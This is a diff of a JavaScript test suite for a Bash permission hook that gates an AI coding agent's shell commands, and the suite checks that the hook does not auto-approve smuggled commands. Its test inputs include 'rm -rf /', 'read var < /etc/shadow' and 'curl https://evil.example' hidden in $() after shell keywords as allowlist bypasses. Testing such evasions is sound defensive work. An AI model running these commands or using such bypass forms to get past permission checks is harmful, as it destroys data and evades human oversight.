@@ -15,7 +15,12 @@ const path = require('path');
 
 const { resolveTmpDir, cleanup } = require('./helpers.cjs');
 
-const HOOK_PATH = path.resolve(__dirname, '..', 'hooks', 'bash-safety-hook.cjs');
+const HOOK_PATH = path.resolve(
+  __dirname,
+  '..',
+  'hooks',
+  'bash-safety-hook.cjs',
+);
 
 // Load the hook module for pure function testing
 const hook = require(HOOK_PATH);
@@ -27,6 +32,10 @@ const {
   parseBashPattern,
   loadMergedSettings,
   decide,
+  detectForcedPromptPattern,
+  hasNonQuantifierBraces,
+  extractWrappedCommand,
+  WRAPPER_COMMANDS,
   _skipShellValue,
   isStandaloneAssignment,
   isInsideQuotes,
@@ -88,14 +97,20 @@ describe('BASH-HOOK-08: splitOnOperators', () => {
 
   test('does NOT split inside bare ( ) nested in $()', () => {
     const result = splitOnOperators('$( (echo a; echo b) )');
-    assert.equal(result.length, 1,
-      'bare parens inside $() must not cause premature depth-0 exit');
+    assert.equal(
+      result.length,
+      1,
+      'bare parens inside $() must not cause premature depth-0 exit',
+    );
   });
 
   test('handles arithmetic $(( )) without double-increment issues', () => {
     const result = splitOnOperators('echo $(( 1 + 2 ))');
-    assert.equal(result.length, 1,
-      'arithmetic $(( )) must remain single segment');
+    assert.equal(
+      result.length,
+      1,
+      'arithmetic $(( )) must remain single segment',
+    );
   });
 });
 
@@ -185,13 +200,17 @@ describe('BASH-HOOK-10: compound all-match -> approve', () => {
   });
 
   test('cd /tmp && git status with allow=[Bash(cd:*), Bash(git:*)] -> approve', () => {
-    const settings = { permissions: { allow: ['Bash(cd:*)', 'Bash(git:*)'], deny: [] } };
+    const settings = {
+      permissions: { allow: ['Bash(cd:*)', 'Bash(git:*)'], deny: [] },
+    };
     const result = decide('cd /tmp && git status', settings);
     assert.equal(result.decision, 'allow');
   });
 
   test('echo hello && printf world with both allowlisted -> approve', () => {
-    const settings = { permissions: { allow: ['Bash(echo:*)', 'Bash(printf:*)'], deny: [] } };
+    const settings = {
+      permissions: { allow: ['Bash(echo:*)', 'Bash(printf:*)'], deny: [] },
+    };
     const result = decide('echo hello && printf world', settings);
     assert.equal(result.decision, 'allow');
   });
@@ -242,16 +261,22 @@ describe('BASH-HOOK-12: reads allowlist from all 4 settings layers', () => {
     try {
       // Layer 1: global settings ($CLAUDE_SETTINGS_PATH)
       const globalSettingsPath = path.join(tmpDir, 'global-settings.json');
-      fs.writeFileSync(globalSettingsPath, JSON.stringify({
-        permissions: { allow: ['Bash(git:*)'], deny: [] }
-      }));
+      fs.writeFileSync(
+        globalSettingsPath,
+        JSON.stringify({
+          permissions: { allow: ['Bash(git:*)'], deny: [] },
+        }),
+      );
 
       // Layer 3: project settings ($CLAUDE_PROJECT_DIR/.claude/settings.json)
       const projectClaudeDir = path.join(tmpDir, 'project', '.claude');
       fs.mkdirSync(projectClaudeDir, { recursive: true });
-      fs.writeFileSync(path.join(projectClaudeDir, 'settings.json'), JSON.stringify({
-        permissions: { allow: ['Bash(npm:*)'], deny: [] }
-      }));
+      fs.writeFileSync(
+        path.join(projectClaudeDir, 'settings.json'),
+        JSON.stringify({
+          permissions: { allow: ['Bash(npm:*)'], deny: [] },
+        }),
+      );
 
       const settings = loadMergedSettings({
         CLAUDE_SETTINGS_PATH: globalSettingsPath,
@@ -259,8 +284,14 @@ describe('BASH-HOOK-12: reads allowlist from all 4 settings layers', () => {
       });
 
       // Both allow patterns should be present
-      assert.ok(settings.permissions.allow.includes('Bash(git:*)'), 'Layer 1 Bash(git:*) should be present');
-      assert.ok(settings.permissions.allow.includes('Bash(npm:*)'), 'Layer 3 Bash(npm:*) should be present');
+      assert.ok(
+        settings.permissions.allow.includes('Bash(git:*)'),
+        'Layer 1 Bash(git:*) should be present',
+      );
+      assert.ok(
+        settings.permissions.allow.includes('Bash(npm:*)'),
+        'Layer 3 Bash(npm:*) should be present',
+      );
     } finally {
       cleanup(tmpDir);
     }
@@ -271,28 +302,40 @@ describe('BASH-HOOK-12: reads allowlist from all 4 settings layers', () => {
     try {
       // Layer 1: $CLAUDE_SETTINGS_PATH
       const globalSettingsPath = path.join(tmpDir, 'settings.json');
-      fs.writeFileSync(globalSettingsPath, JSON.stringify({
-        permissions: { allow: ['Bash(git:*)'], deny: [] }
-      }));
+      fs.writeFileSync(
+        globalSettingsPath,
+        JSON.stringify({
+          permissions: { allow: ['Bash(git:*)'], deny: [] },
+        }),
+      );
 
       // Layer 2: ~/.claude/settings.local.json — simulated via project-local
       const homeClaudeDir = path.join(tmpDir, 'home', '.claude');
       fs.mkdirSync(homeClaudeDir, { recursive: true });
-      fs.writeFileSync(path.join(homeClaudeDir, 'settings.local.json'), JSON.stringify({
-        permissions: { allow: ['Bash(curl:*)'], deny: [] }
-      }));
+      fs.writeFileSync(
+        path.join(homeClaudeDir, 'settings.local.json'),
+        JSON.stringify({
+          permissions: { allow: ['Bash(curl:*)'], deny: [] },
+        }),
+      );
 
       // Layer 3: $CLAUDE_PROJECT_DIR/.claude/settings.json
       const projectClaudeDir = path.join(tmpDir, 'project', '.claude');
       fs.mkdirSync(projectClaudeDir, { recursive: true });
-      fs.writeFileSync(path.join(projectClaudeDir, 'settings.json'), JSON.stringify({
-        permissions: { allow: ['Bash(npm:*)'], deny: [] }
-      }));
+      fs.writeFileSync(
+        path.join(projectClaudeDir, 'settings.json'),
+        JSON.stringify({
+          permissions: { allow: ['Bash(npm:*)'], deny: [] },
+        }),
+      );
 
       // Layer 4: $CLAUDE_PROJECT_DIR/.claude/settings.local.json
-      fs.writeFileSync(path.join(projectClaudeDir, 'settings.local.json'), JSON.stringify({
-        permissions: { allow: ['Bash(node:*)'], deny: [] }
-      }));
+      fs.writeFileSync(
+        path.join(projectClaudeDir, 'settings.local.json'),
+        JSON.stringify({
+          permissions: { allow: ['Bash(node:*)'], deny: [] },
+        }),
+      );
 
       const settings = loadMergedSettings({
         CLAUDE_SETTINGS_PATH: globalSettingsPath,
@@ -300,10 +343,22 @@ describe('BASH-HOOK-12: reads allowlist from all 4 settings layers', () => {
         HOME: path.join(tmpDir, 'home'),
       });
 
-      assert.ok(settings.permissions.allow.includes('Bash(git:*)'), 'Layer 1 should be merged');
-      assert.ok(settings.permissions.allow.includes('Bash(curl:*)'), 'Layer 2 should be merged');
-      assert.ok(settings.permissions.allow.includes('Bash(npm:*)'), 'Layer 3 should be merged');
-      assert.ok(settings.permissions.allow.includes('Bash(node:*)'), 'Layer 4 should be merged');
+      assert.ok(
+        settings.permissions.allow.includes('Bash(git:*)'),
+        'Layer 1 should be merged',
+      );
+      assert.ok(
+        settings.permissions.allow.includes('Bash(curl:*)'),
+        'Layer 2 should be merged',
+      );
+      assert.ok(
+        settings.permissions.allow.includes('Bash(npm:*)'),
+        'Layer 3 should be merged',
+      );
+      assert.ok(
+        settings.permissions.allow.includes('Bash(node:*)'),
+        'Layer 4 should be merged',
+      );
     } finally {
       cleanup(tmpDir);
     }
@@ -344,33 +399,48 @@ describe('BASH-HOOK-NO-BUILTINS: builtins are NOT auto-approved without allowlis
 
   test('echo hello -> passthrough without allowlist', () => {
     const result = decide('echo hello', noSettings);
-    assert.equal(result.decision, 'passthrough',
-      'echo must not be auto-approved without explicit allowlist entry');
+    assert.equal(
+      result.decision,
+      'passthrough',
+      'echo must not be auto-approved without explicit allowlist entry',
+    );
   });
 
   test('cd /tmp -> passthrough without allowlist', () => {
     const result = decide('cd /tmp', noSettings);
-    assert.equal(result.decision, 'passthrough',
-      'cd must not be auto-approved without explicit allowlist entry');
+    assert.equal(
+      result.decision,
+      'passthrough',
+      'cd must not be auto-approved without explicit allowlist entry',
+    );
   });
 
   test('echo "x" > ~/.bashrc -> passthrough (redirection bypass blocked)', () => {
     const result = decide('echo "x" > ~/.bashrc', noSettings);
-    assert.equal(result.decision, 'passthrough',
-      'echo with redirection must not be auto-approved');
+    assert.equal(
+      result.decision,
+      'passthrough',
+      'echo with redirection must not be auto-approved',
+    );
   });
 
   test('read var < /etc/shadow -> passthrough (redirection bypass blocked)', () => {
     const result = decide('read var < /etc/shadow', noSettings);
-    assert.equal(result.decision, 'passthrough',
-      'read with redirection must not be auto-approved');
+    assert.equal(
+      result.decision,
+      'passthrough',
+      'read with redirection must not be auto-approved',
+    );
   });
 
   test('echo hello -> approve WITH explicit allowlist', () => {
     const settings = { permissions: { allow: ['Bash(echo:*)'], deny: [] } };
     const result = decide('echo hello', settings);
-    assert.equal(result.decision, 'allow',
-      'echo must be approved when explicitly allowlisted');
+    assert.equal(
+      result.decision,
+      'allow',
+      'echo must be approved when explicitly allowlisted',
+    );
   });
 });
 
@@ -437,7 +507,11 @@ describe('BASH-HOOK-NORMALIZE: command normalization', () => {
 
   test('done keyword filtered out (structural keyword)', () => {
     const cmds = decomposeCommand('done');
-    assert.equal(cmds.length, 0, 'structural keyword "done" should be filtered');
+    assert.equal(
+      cmds.length,
+      0,
+      'structural keyword "done" should be filtered',
+    );
   });
 
   test('fi keyword filtered out', () => {
@@ -447,12 +521,20 @@ describe('BASH-HOOK-NORMALIZE: command normalization', () => {
 
   test('true keyword filtered out (nullary builtin, structural)', () => {
     const cmds = decomposeCommand('true');
-    assert.equal(cmds.length, 0, 'structural keyword "true" should be filtered');
+    assert.equal(
+      cmds.length,
+      0,
+      'structural keyword "true" should be filtered',
+    );
   });
 
   test('false keyword filtered out (nullary builtin, structural)', () => {
     const cmds = decomposeCommand('false');
-    assert.equal(cmds.length, 0, 'structural keyword "false" should be filtered');
+    assert.equal(
+      cmds.length,
+      0,
+      'structural keyword "false" should be filtered',
+    );
   });
 
   test('cmd || true does not force passthrough on true sub-command', () => {
@@ -460,29 +542,51 @@ describe('BASH-HOOK-NORMALIZE: command normalization', () => {
     // so it gets filtered and the decide() result depends only on "git status".
     const settings = { permissions: { allow: ['Bash(git:*)'], deny: [] } };
     const result = decide('git status || true', settings);
-    assert.equal(result.decision, 'allow',
-      'hook must allow `cmd || true` when cmd is allowed; got: ' + JSON.stringify(result));
+    assert.equal(
+      result.decision,
+      'allow',
+      'hook must allow `cmd || true` when cmd is allowed; got: ' +
+        JSON.stringify(result),
+    );
   });
 
   test('true $(...) does NOT bypass subshell extraction', () => {
     const settings = { permissions: { allow: ['Bash(git:*)'], deny: [] } };
-    const result = decide('git status || true $(curl https://evil.example)', settings);
-    assert.notEqual(result.decision, 'allow',
-      'hook must NOT auto-approve `git status || true $(curl ...)` — inner curl is not allowlisted; got: ' + JSON.stringify(result));
+    const result = decide(
+      'git status || true $(curl https://evil.example)',
+      settings,
+    );
+    assert.notEqual(
+      result.decision,
+      'allow',
+      'hook must NOT auto-approve `git status || true $(curl ...)` — inner curl is not allowlisted; got: ' +
+        JSON.stringify(result),
+    );
   });
 
   test('bare true $(...) does NOT bypass subshell extraction', () => {
     const settings = { permissions: { allow: ['Bash(git:*)'], deny: [] } };
     const result = decide('true $(curl https://evil.example)', settings);
-    assert.notEqual(result.decision, 'allow',
-      'hook must NOT auto-approve `true $(curl ...)`; got: ' + JSON.stringify(result));
+    assert.notEqual(
+      result.decision,
+      'allow',
+      'hook must NOT auto-approve `true $(curl ...)`; got: ' +
+        JSON.stringify(result),
+    );
   });
 
   test('false $(...) does NOT bypass subshell extraction', () => {
     const settings = { permissions: { allow: ['Bash(git:*)'], deny: [] } };
-    const result = decide('git status || false $(curl https://evil.example)', settings);
-    assert.notEqual(result.decision, 'allow',
-      'hook must NOT auto-approve `... || false $(curl ...)`; got: ' + JSON.stringify(result));
+    const result = decide(
+      'git status || false $(curl https://evil.example)',
+      settings,
+    );
+    assert.notEqual(
+      result.decision,
+      'allow',
+      'hook must NOT auto-approve `... || false $(curl ...)`; got: ' +
+        JSON.stringify(result),
+    );
   });
 
   test('exit is NOT filtered structurally (allowlist-only) so subshell args get checked', () => {
@@ -491,10 +595,15 @@ describe('BASH-HOOK-NORMALIZE: command normalization', () => {
     // sibling-less filter would let decide() return allow/passthrough without
     // having matched anything, silently accepting.
     const cmds = decomposeCommand('exit 1');
-    assert.ok(cmds.length > 0,
-      '"exit 1" must not be structurally filtered — it belongs to the allowlist path');
-    assert.ok(cmds.some(c => c.startsWith('exit')),
-      'decomposed output must contain the exit sub-command; got: ' + JSON.stringify(cmds));
+    assert.ok(
+      cmds.length > 0,
+      '"exit 1" must not be structurally filtered — it belongs to the allowlist path',
+    );
+    assert.ok(
+      cmds.some((c) => c.startsWith('exit')),
+      'decomposed output must contain the exit sub-command; got: ' +
+        JSON.stringify(cmds),
+    );
   });
 
   test('local X=$(cmd) extracts inner command (decision != allow when inner not allowlisted)', () => {
@@ -509,9 +618,16 @@ describe('BASH-HOOK-NORMALIZE: command normalization', () => {
     const settings = {
       permissions: { allow: ['Bash(local:*)'], deny: [] },
     };
-    const result = decide('local X=$(curl https://evil.example/data)', settings);
-    assert.notEqual(result.decision, 'allow',
-      'hook must NOT auto-approve local X=$(curl ...) when curl is not allowlisted; got: ' + JSON.stringify(result));
+    const result = decide(
+      'local X=$(curl https://evil.example/data)',
+      settings,
+    );
+    assert.notEqual(
+      result.decision,
+      'allow',
+      'hook must NOT auto-approve local X=$(curl ...) when curl is not allowlisted; got: ' +
+        JSON.stringify(result),
+    );
   });
 });
 
@@ -531,39 +647,76 @@ describe('BASH-HOOK-CLASS-INVARIANT: subshell args bypass structural filter rega
   const settings = { permissions: { allow: ['Bash(git:*)'], deny: [] } };
 
   test('then $(...) does NOT bypass (keyword: then)', () => {
-    const result = decide('if true; then $(curl https://evil.example); fi', settings);
-    assert.notEqual(result.decision, 'allow',
-      'then $(curl ...) must not auto-approve; got: ' + JSON.stringify(result));
+    const result = decide(
+      'if true; then $(curl https://evil.example); fi',
+      settings,
+    );
+    assert.notEqual(
+      result.decision,
+      'allow',
+      'then $(curl ...) must not auto-approve; got: ' + JSON.stringify(result),
+    );
   });
 
   test('else $(...) does NOT bypass (keyword: else)', () => {
-    const result = decide('if false; else $(curl https://evil.example); fi', settings);
-    assert.notEqual(result.decision, 'allow',
-      'else $(curl ...) must not auto-approve; got: ' + JSON.stringify(result));
+    const result = decide(
+      'if false; else $(curl https://evil.example); fi',
+      settings,
+    );
+    assert.notEqual(
+      result.decision,
+      'allow',
+      'else $(curl ...) must not auto-approve; got: ' + JSON.stringify(result),
+    );
   });
 
   test('elif $(...) does NOT bypass (keyword: elif)', () => {
-    const result = decide('if x; elif $(curl https://evil.example); then y; fi', settings);
-    assert.notEqual(result.decision, 'allow',
-      'elif $(curl ...) must not auto-approve; got: ' + JSON.stringify(result));
+    const result = decide(
+      'if x; elif $(curl https://evil.example); then y; fi',
+      settings,
+    );
+    assert.notEqual(
+      result.decision,
+      'allow',
+      'elif $(curl ...) must not auto-approve; got: ' + JSON.stringify(result),
+    );
   });
 
   test('do $(...) does NOT bypass (keyword: do)', () => {
-    const result = decide('while x; do $(curl https://evil.example); done', settings);
-    assert.notEqual(result.decision, 'allow',
-      'do $(curl ...) must not auto-approve; got: ' + JSON.stringify(result));
+    const result = decide(
+      'while x; do $(curl https://evil.example); done',
+      settings,
+    );
+    assert.notEqual(
+      result.decision,
+      'allow',
+      'do $(curl ...) must not auto-approve; got: ' + JSON.stringify(result),
+    );
   });
 
   test('break $(...) does NOT bypass (keyword: break)', () => {
-    const result = decide('for i in a b; do echo $i; break $(curl https://evil.example); done', settings);
-    assert.notEqual(result.decision, 'allow',
-      'break $(curl ...) must not auto-approve; got: ' + JSON.stringify(result));
+    const result = decide(
+      'for i in a b; do echo $i; break $(curl https://evil.example); done',
+      settings,
+    );
+    assert.notEqual(
+      result.decision,
+      'allow',
+      'break $(curl ...) must not auto-approve; got: ' + JSON.stringify(result),
+    );
   });
 
   test('continue $(...) does NOT bypass (keyword: continue)', () => {
-    const result = decide('for i in a b; do echo $i; continue $(curl https://evil.example); done', settings);
-    assert.notEqual(result.decision, 'allow',
-      'continue $(curl ...) must not auto-approve; got: ' + JSON.stringify(result));
+    const result = decide(
+      'for i in a b; do echo $i; continue $(curl https://evil.example); done',
+      settings,
+    );
+    assert.notEqual(
+      result.decision,
+      'allow',
+      'continue $(curl ...) must not auto-approve; got: ' +
+        JSON.stringify(result),
+    );
   });
 
   // Concrete-bypass demonstrations: with a sibling allowlisted command, the
@@ -572,15 +725,29 @@ describe('BASH-HOOK-CLASS-INVARIANT: subshell args bypass structural filter rega
   // which hits the allowlist and returns `allow`. These two tests fail
   // before the decompose-loop reorder.
   test('CONCRETE BYPASS: git status; break $(curl ...) must not allow', () => {
-    const result = decide('git status; break $(curl https://evil.example)', settings);
-    assert.notEqual(result.decision, 'allow',
-      'sibling-allowlisted break $(curl ...) must not auto-approve; got: ' + JSON.stringify(result));
+    const result = decide(
+      'git status; break $(curl https://evil.example)',
+      settings,
+    );
+    assert.notEqual(
+      result.decision,
+      'allow',
+      'sibling-allowlisted break $(curl ...) must not auto-approve; got: ' +
+        JSON.stringify(result),
+    );
   });
 
   test('CONCRETE BYPASS: git status; continue $(curl ...) must not allow', () => {
-    const result = decide('git status; continue $(curl https://evil.example)', settings);
-    assert.notEqual(result.decision, 'allow',
-      'sibling-allowlisted continue $(curl ...) must not auto-approve; got: ' + JSON.stringify(result));
+    const result = decide(
+      'git status; continue $(curl https://evil.example)',
+      settings,
+    );
+    assert.notEqual(
+      result.decision,
+      'allow',
+      'sibling-allowlisted continue $(curl ...) must not auto-approve; got: ' +
+        JSON.stringify(result),
+    );
   });
 });
 
@@ -593,33 +760,54 @@ describe('BASH-HOOK-HEREDOC: heredoc body lines are not treated as sub-commands'
     const input = 'cat <<EOF\nhello world\nrm -rf /\nEOF';
     const result = stripHeredocs(input);
     assert.ok(!result.includes('rm -rf /'), 'heredoc body must be stripped');
-    assert.ok(result.includes('cat <<EOF'), 'heredoc marker line must be preserved');
+    assert.ok(
+      result.includes('cat <<EOF'),
+      'heredoc marker line must be preserved',
+    );
   });
 
   test('stripHeredocs handles quoted delimiter', () => {
     const input = "cat <<'EOF'\nsome body\nEOF";
     const result = stripHeredocs(input);
-    assert.ok(!result.includes('some body'), 'heredoc body with quoted delim must be stripped');
+    assert.ok(
+      !result.includes('some body'),
+      'heredoc body with quoted delim must be stripped',
+    );
   });
 
   test('stripHeredocs handles <<- (indented) heredoc', () => {
     const input = 'cat <<-DELIM\n\tindented body\nDELIM';
     const result = stripHeredocs(input);
-    assert.ok(!result.includes('indented body'), 'indented heredoc body must be stripped');
+    assert.ok(
+      !result.includes('indented body'),
+      'indented heredoc body must be stripped',
+    );
   });
 
   test('stripHeredocs handles delimiter with hyphen (EOF-1)', () => {
     const input = 'cat <<EOF-1\nheredoc body\nEOF-1';
     const result = stripHeredocs(input);
-    assert.ok(!result.includes('heredoc body'), 'heredoc body with hyphenated delim must be stripped');
-    assert.ok(result.includes('cat <<EOF-1'), 'heredoc marker line must be preserved');
+    assert.ok(
+      !result.includes('heredoc body'),
+      'heredoc body with hyphenated delim must be stripped',
+    );
+    assert.ok(
+      result.includes('cat <<EOF-1'),
+      'heredoc marker line must be preserved',
+    );
   });
 
   test('stripHeredocs handles delimiter with dot (END.TXT)', () => {
     const input = 'cat <<END.TXT\nheredoc body\nEND.TXT';
     const result = stripHeredocs(input);
-    assert.ok(!result.includes('heredoc body'), 'heredoc body with dotted delim must be stripped');
-    assert.ok(result.includes('cat <<END.TXT'), 'heredoc marker line must be preserved');
+    assert.ok(
+      !result.includes('heredoc body'),
+      'heredoc body with dotted delim must be stripped',
+    );
+    assert.ok(
+      result.includes('cat <<END.TXT'),
+      'heredoc marker line must be preserved',
+    );
   });
 
   test('stripHeredocs passes through commands without heredocs', () => {
@@ -638,8 +826,11 @@ describe('BASH-HOOK-HEREDOC: heredoc body lines are not treated as sub-commands'
     // The "rm -rf /" is inside a heredoc body -- it's data, not a command
     const result = decide('cat <<EOF\nrm -rf /\nEOF', settings);
     // Should NOT deny -- the rm -rf is heredoc content, not a real command
-    assert.notEqual(result.decision, 'deny',
-      'heredoc body text must not trigger deny patterns');
+    assert.notEqual(
+      result.decision,
+      'deny',
+      'heredoc body text must not trigger deny patterns',
+    );
   });
 
   test('command after heredoc is still checked', () => {
@@ -652,26 +843,36 @@ describe('BASH-HOOK-HEREDOC: heredoc body lines are not treated as sub-commands'
   test('stripHeredocs does NOT strip when << is inside double quotes', () => {
     const input = 'echo "not a heredoc <<EOF"\nrm -rf /\nEOF';
     const result = stripHeredocs(input);
-    assert.ok(result.includes('rm -rf /'),
-      '<< inside double quotes must NOT trigger heredoc stripping');
-    assert.ok(result.includes('EOF'),
-      'EOF line must be preserved when << was inside quotes');
+    assert.ok(
+      result.includes('rm -rf /'),
+      '<< inside double quotes must NOT trigger heredoc stripping',
+    );
+    assert.ok(
+      result.includes('EOF'),
+      'EOF line must be preserved when << was inside quotes',
+    );
   });
 
   test('stripHeredocs does NOT strip when << is inside single quotes', () => {
     const input = "echo 'text <<EOF'\nrm -rf /\nEOF";
     const result = stripHeredocs(input);
-    assert.ok(result.includes('rm -rf /'),
-      '<< inside single quotes must NOT trigger heredoc stripping');
+    assert.ok(
+      result.includes('rm -rf /'),
+      '<< inside single quotes must NOT trigger heredoc stripping',
+    );
   });
 
   test('stripHeredocs still strips real heredocs after quoted << on different line', () => {
     const input = 'echo "has <<EOF in quotes"\ncat <<REAL\nheredoc body\nREAL';
     const result = stripHeredocs(input);
-    assert.ok(result.includes('echo "has <<EOF in quotes"'),
-      'quoted << line must be preserved');
-    assert.ok(!result.includes('heredoc body'),
-      'real heredoc on subsequent line must still be stripped');
+    assert.ok(
+      result.includes('echo "has <<EOF in quotes"'),
+      'quoted << line must be preserved',
+    );
+    assert.ok(
+      !result.includes('heredoc body'),
+      'real heredoc on subsequent line must still be stripped',
+    );
   });
 });
 
@@ -687,61 +888,81 @@ describe('BASH-HOOK-HERESTRING: here-strings must not trigger heredoc stripping'
   test('here-string with double-quoted value does not eat next line', () => {
     const input = 'cat <<<"$x"\nrm -rf /';
     const result = stripHeredocs(input);
-    assert.ok(result.includes('rm -rf /'),
-      '<<< must not trigger heredoc — rm -rf / must survive');
+    assert.ok(
+      result.includes('rm -rf /'),
+      '<<< must not trigger heredoc — rm -rf / must survive',
+    );
   });
 
   test('here-string with bare word does not eat next line', () => {
     const input = 'cat <<<word\nrm -rf /';
     const result = stripHeredocs(input);
-    assert.ok(result.includes('rm -rf /'),
-      '<<<word must not trigger heredoc — rm -rf / must survive');
+    assert.ok(
+      result.includes('rm -rf /'),
+      '<<<word must not trigger heredoc — rm -rf / must survive',
+    );
   });
 
   test('here-string with single-quoted value does not eat next line', () => {
     const input = "cat <<<'word'\nrm -rf /";
     const result = stripHeredocs(input);
-    assert.ok(result.includes('rm -rf /'),
-      "<<<'word' must not trigger heredoc — rm -rf / must survive");
+    assert.ok(
+      result.includes('rm -rf /'),
+      "<<<'word' must not trigger heredoc — rm -rf / must survive",
+    );
   });
 
   test('here-string with space does not eat next line', () => {
     const input = 'cat <<< word\nrm -rf /';
     const result = stripHeredocs(input);
-    assert.ok(result.includes('rm -rf /'),
-      '<<< word must not trigger heredoc — rm -rf / must survive');
+    assert.ok(
+      result.includes('rm -rf /'),
+      '<<< word must not trigger heredoc — rm -rf / must survive',
+    );
   });
 
   test('four angle brackets does not trigger heredoc', () => {
     const input = '<<<<\nrm -rf /';
     const result = stripHeredocs(input);
-    assert.ok(result.includes('rm -rf /'),
-      '<<<< must not trigger heredoc — rm -rf / must survive');
+    assert.ok(
+      result.includes('rm -rf /'),
+      '<<<< must not trigger heredoc — rm -rf / must survive',
+    );
   });
 
   test('here-string on same line as real heredoc: only heredoc strips', () => {
     const input = 'cat <<<x\ncmd <<EOF\nheredoc body\nEOF\necho done';
     const result = stripHeredocs(input);
-    assert.ok(result.includes('cat <<<x'),
-      'here-string line must be preserved');
-    assert.ok(!result.includes('heredoc body'),
-      'real heredoc body must be stripped');
-    assert.ok(result.includes('echo done'),
-      'line after heredoc terminator must survive');
+    assert.ok(
+      result.includes('cat <<<x'),
+      'here-string line must be preserved',
+    );
+    assert.ok(
+      !result.includes('heredoc body'),
+      'real heredoc body must be stripped',
+    );
+    assert.ok(
+      result.includes('echo done'),
+      'line after heredoc terminator must survive',
+    );
   });
 
   test('here-string with non-word value (<<<EOF-1) does not eat next line', () => {
     const input = 'cat <<<EOF-1\nrm -rf /';
     const result = stripHeredocs(input);
-    assert.ok(result.includes('rm -rf /'),
-      '<<<EOF-1 must not trigger heredoc — rm -rf / must survive');
+    assert.ok(
+      result.includes('rm -rf /'),
+      '<<<EOF-1 must not trigger heredoc — rm -rf / must survive',
+    );
   });
 
   test('here-string with dotted value (<<<END.TXT) does not eat next line', () => {
     const input = 'cat <<<END.TXT\nrm -rf /';
     const result = stripHeredocs(input);
-    assert.ok(result.includes('rm -rf /'),
-      '<<<END.TXT must not trigger heredoc — rm -rf / must survive');
+    assert.ok(
+      result.includes('rm -rf /'),
+      '<<<END.TXT must not trigger heredoc — rm -rf / must survive',
+    );
   });
 });
 
@@ -780,10 +1001,14 @@ describe('BASH-HOOK-SUBSHELL-DEPTH: $() followed by operators must split correct
   });
 
   test('$() with allowlisted commands does NOT auto-approve chained dangerous command', () => {
-    const settings = { permissions: { allow: ['Bash(echo:*)', 'Bash(git:*)'], deny: [] } };
+    const settings = {
+      permissions: { allow: ['Bash(echo:*)', 'Bash(git:*)'], deny: [] },
+    };
     const result = decide('echo $(git status) && rm -rf /', settings);
-    assert.ok(result.decision !== 'allow',
-      'echo $(git status) && rm -rf / must NOT be auto-approved');
+    assert.ok(
+      result.decision !== 'allow',
+      'echo $(git status) && rm -rf / must NOT be auto-approved',
+    );
   });
 });
 
@@ -808,14 +1033,21 @@ describe('BASH-HOOK-GRACEFUL: hook process graceful degradation', () => {
 
   // Create an isolated HOME so developer's ~/.claude/settings*.json can't leak
   before(() => {
-    hermetic_home = fs.mkdtempSync(path.join(resolveTmpDir(), 'gsd-hook-home-'));
+    hermetic_home = fs.mkdtempSync(
+      path.join(resolveTmpDir(), 'gsd-hook-home-'),
+    );
   });
   after(() => {
     cleanup(hermetic_home);
   });
 
   function runHook(stdin, env = {}) {
-    const mergedEnv = Object.assign({}, process.env, { HOME: hermetic_home }, env);
+    const mergedEnv = Object.assign(
+      {},
+      process.env,
+      { HOME: hermetic_home },
+      env,
+    );
     const result = spawnSync(process.execPath, [HOOK_PATH], {
       input: stdin,
       encoding: 'utf8',
@@ -849,8 +1081,10 @@ describe('BASH-HOOK-GRACEFUL: hook process graceful degradation', () => {
     // Write a settings file with git allowlisted into the hermetic home
     const claudeDir = path.join(hermetic_home, '.claude');
     fs.mkdirSync(claudeDir, { recursive: true });
-    fs.writeFileSync(path.join(claudeDir, 'settings.json'),
-      JSON.stringify({ permissions: { allow: ['Bash(git:*)'], deny: [] } }));
+    fs.writeFileSync(
+      path.join(claudeDir, 'settings.json'),
+      JSON.stringify({ permissions: { allow: ['Bash(git:*)'], deny: [] } }),
+    );
 
     const validInput = JSON.stringify({
       tool_name: 'Bash',
@@ -876,7 +1110,11 @@ describe('BASH-HOOK-GRACEFUL: hook process graceful degradation', () => {
   test('non-Bash tool -> exits 0 with no output (hook only applies to Bash)', () => {
     const validInput = JSON.stringify({
       tool_name: 'Edit',
-      tool_input: { file_path: '/tmp/test.txt', old_string: 'a', new_string: 'b' },
+      tool_input: {
+        file_path: '/tmp/test.txt',
+        old_string: 'a',
+        new_string: 'b',
+      },
     });
     const result = runHook(validInput);
     assert.equal(result.status, 0);
@@ -908,49 +1146,982 @@ describe('BASH-HOOK-SUBSHELL: $() and backtick contents are checked independentl
   test('echo $(rm -rf /) not approved when rm is not allowed', () => {
     const settings = { permissions: { allow: ['Bash(echo:*)'], deny: [] } };
     const result = decide('echo $(rm -rf /)', settings);
-    assert.notEqual(result.decision, 'allow',
-      'must not auto-approve when subshell contains non-allowed command');
+    assert.notEqual(
+      result.decision,
+      'allow',
+      'must not auto-approve when subshell contains non-allowed command',
+    );
   });
 
-  test('echo $(git status) approved when both echo and git are allowlisted', () => {
-    const settings = { permissions: { allow: ['Bash(echo:*)', 'Bash(git:*)'], deny: [] } };
+  test('echo $(git status) is DENIED by forced-prompt pre-check (CC expansion guard)', () => {
+    // Even with both echo and git allowlisted, the new pre-check denies $(...)
+    // because Claude Code's expansion guard always prompts on it. The deny
+    // surfaces a suggestion to the agent so it rewrites without expansion.
+    const settings = {
+      permissions: { allow: ['Bash(echo:*)', 'Bash(git:*)'], deny: [] },
+    };
     const result = decide('echo $(git status)', settings);
-    assert.equal(result.decision, 'allow');
+    assert.equal(result.decision, 'deny');
+    assert.ok(
+      /expansion guard/i.test(result.reason),
+      'reason should explain the expansion-guard rationale',
+    );
+    assert.ok(
+      /GSD_HOOK_ALLOW_EXPANSION/.test(result.reason),
+      'reason should advertise the escape-hatch env var',
+    );
+  });
+
+  test('echo $(git status) is ALLOWED when GSD_HOOK_ALLOW_EXPANSION=1 escape hatch is set', () => {
+    const settings = {
+      permissions: { allow: ['Bash(echo:*)', 'Bash(git:*)'], deny: [] },
+    };
+    const prev = process.env.GSD_HOOK_ALLOW_EXPANSION;
+    process.env.GSD_HOOK_ALLOW_EXPANSION = '1';
+    try {
+      const result = decide('echo $(git status)', settings);
+      assert.equal(result.decision, 'allow');
+    } finally {
+      if (prev === undefined) delete process.env.GSD_HOOK_ALLOW_EXPANSION;
+      else process.env.GSD_HOOK_ALLOW_EXPANSION = prev;
+    }
   });
 
   test('extractSubshells handles ) inside quotes in $()', () => {
     const subs = extractSubshells('echo $(echo ")"; rm -rf /)');
     // The full subshell content should be extracted, not cut short at the quoted )
-    const hasRm = subs.some(s => s.includes('rm -rf'));
+    const hasRm = subs.some((s) => s.includes('rm -rf'));
     assert.ok(hasRm, 'must extract full $() content past quoted )');
   });
 
   test('extractSubshells handles escaped backtick', () => {
